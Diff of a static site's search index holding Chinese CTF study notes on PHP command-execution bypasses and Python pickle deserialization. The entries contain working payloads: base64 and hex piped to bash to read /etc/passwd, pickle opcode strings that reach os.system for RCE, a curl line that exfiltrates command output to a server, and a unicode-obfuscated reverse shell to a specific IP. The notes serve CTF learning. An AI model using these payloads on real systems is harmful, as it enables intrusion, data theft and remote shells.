-                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n",
+                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\n",
                 content: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n# 回显只有数字情况下，使用od进行输出： od -t d1 /flag # 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。 # 16进制，先bin2hex php -r eval(hex2bin(substr(_十六进制,1))) # 63617420666c61672e706870是cat flag.php的16进制 # cat /etc/passwd echo \"636174202F6574632F706173737764\" | xxd -r -p|bash # php 十六进制绕过 system(); \"\\x73\\x79\\x73\\x74\\x65\\x6d\"(); # 或者base64/32 echo \"base64编码\"|base64 -d|bash echo \"base64编码\"|base64 -d|sh echo 'Y2F0wqAK' | base64 -d /etc/passwd # cat /etc/passwd # 八进制 # ls $(printf \"\\154\\163\") 绕过空格\n%09（url传递）(tab) %20(space) ${IFS} $IFS$9 $IFS$1 \u003c\u003e（cat\u003c\u003e/flag） \u003c（cat"
             }
         );
@@ -1277,7 +1774,7 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                 id:  11 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/",
                 title: "Pickle反序列化",
-                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n",
+                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\n",
                 content: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n更多参考\nb'Vabcd\\np0\\n.'\nV：unicode编码 p：将堆栈最上面的项目复制到memo中 使用pickletools将opcode转换为易于读取的形式\nimport pickletools data=b\"\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b'1'\\nkey2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1'\\nkey2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 利用方法 linkR指令 link原理 link大多数题目利用__reduce__方法，其指令码为R，作用为：\n取栈顶元素为args，弹出 取栈顶为f，弹出 arg为参数，执行f，结果压入栈 此方法会在反序列化的时候执行，f会返回字符串或元组。\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nb'''cos system (S'whoami' tR.''' 利用此方法构造恶意字符串：\nclass Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def __reduce__(self): return os.system, (\"ls /\",) a = pickle.dumps(Student(), protocol=3) 绕过方式 link 如果黑名单没禁全，尝试`platform.popen(cmd, mode=‘r’, bufsize=-1) 使用map class Exploit(object): def __reduce__(self): return map,(os.system,[\"ls\"]) i指令码 link b'''(S'whoami' ios system .''' 先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。\n0: ( MARK 1: S STRING 'whoami' 11: i INST 'os system' (MARK at 0) 22: . STOP o指令码 link b'''(cos system S'whoami' o.''' 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。\n0: ( MARK 1: c GLOBAL 'os system' 12: S STRING 'whoami' 22: o OBJ (MARK at 0) 23: . STOP c指令码 link原理 link class Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def check(data): if b'R' in data: return 0 x = pickle.loads(data) if x != Student(blue.name,blue.grade): return 0 return 1 c指令码的作用是获取全局变量，故而可以通过替换rxz为blue.name即可 换成指令是cblue\\nname\\n。 原本是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00rxzq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.' 最后结果是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00namecblue\\nname\\nq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.'\n绕过 link如果题目对c指令进行了限制，只允许包含__main__这一个模块，则可以使用变量覆盖。 通过此指令引入的变量，可以看作是原变量的引用，从栈上修改他，也会修改原变量。\n先通过__main__.blue引入这个module 然后把一个dict压入栈，内容为{'name': 'rua', 'grade': 'www'} 执行b指令，会改写__main__.blue.name和 __main__.blue.grade，因此两个变量的值都变为了预期值，后面再正常压入Student对象即可 结果： b'\\x80\\x03c__main__\\nblue\\n}(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.' b指令RCE link原理 link执行build时，当inst拥有__setstate__方法时，把state交给他处理，否则合并到元组内。 所以可以先用build写入{'__setstate__': os.system}，把对象的__setstate__变为os.system，接下来利用\"ls /\"再build对象，会执行__setstate__(\"ls /\")，从而达成RCE。 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.' 执行完代码后清空栈，再压入一个正常的类即可防止报错 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.'\n绕过 link针对重写find_class的，可以利用sys.module获取危险函数。 sys.module是一个全局字典，字典的键是模块名，值是模块本身。 所以可以通过get(sys.modules,\"moduleName\")获取危险模块。\nprint(sys.modules) # 输出全部模块 最终需要构造的payload是：builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 写成opcode：\nb'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 其他 link 其他模块的load也可能触发pickle反序列化，如numpy.load()，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。 即使代码里面没有import os，GLOBAL指令也会自动导入。 无回显时执行os.system('curl your_server/`ls / | base64`)即可在日志中查看结果。 payload: b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVcurl 47.***.***.105/`ls / | base64`\\nb.' 绕过各种限制的方式和jail一样 如双写\npk = pickle.dumps(yourobject) pk = pk.replace(b'os', b'ooss') 字符串拼接\nclass A(object): def __reduce__(self): return eval,(\"__import__('o'+'s').system('env |tee b')\",) 其他：\na = base64.b64decode(session.get('ser_data')).replace(b\"builtin\", b\"BuIltIn\").replace(b\"os\", b\"Os\").replace(b\"bytes\", b\"Bytes\") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(\"R i o b is forbidden\") pickle.loads(base64.b64decode(session.get('ser_data'))) 检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过 反弹shell用到i，会被检测，所以用V，能识别unicode编码\nb'''(cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 因为s的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：\nb'''(S'ba' S'ss' dS'sdasda' (cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 手写opcode link三种print的方法：\n# __import__(\"builtins\").print('a', 'b') R = b'''cbuiltins print (S'a' S'b' tR. ''' o = b'''(cbuiltins print S'a' S'b' o. ''' i = b'''(S'a' S'b' ibuiltins print . ''' 例：执行系统命令： builtins.getattr(builtins, 'eval')(\"__import__('os').system('pwd')\") 用到c指令导入的有builtins.getattr和builtins，但pickle不能直接获取builtins一级模块，所以builtins不能直接导入，需要用： builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins')获取。 组合得到： builtins.getattr(builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins'), 'eval')(\"__import__('os').system('pwd')\") 分层编写opcode： 最内层function(\"__import__('os').system('pwd')\")\nb'''( S'__import__('os').system('pwd')' o. ''' 然后是最外层的builtins.getattr\nb'''( /////// (cbuiltins getattr arg1 S'eval' o /////// S'__import__('os').system('pwd')' o. ''' 补全arg1，从内层开始`(builtins.globals(), ‘builtins’)\nb'''((cbuiltins getattr /////// (cbuiltins globals o S'builtins' /////// S'eval' o S'__import__('os').system('pwd')' o. ''' pickletools.dis(test) 最后是builtins.getattr(builtins.dict, 'get')\nb'''((cbuiltins getattr ( /////// (cbuiltins getattr cbuiltins dict S'get' o /////// (cbuiltins globals o S'builtins' o S'eval' o S'__import__('os').system('pwd')' o. ''' 最终payload：\nb'''((cbuiltins getattr ((cbuiltins getattr cbuiltins dict S'get' o(cbuiltins globals oS'builtins' oS'eval' oS'__import__('os').system('whoami')' o. ''' "
             }
         );
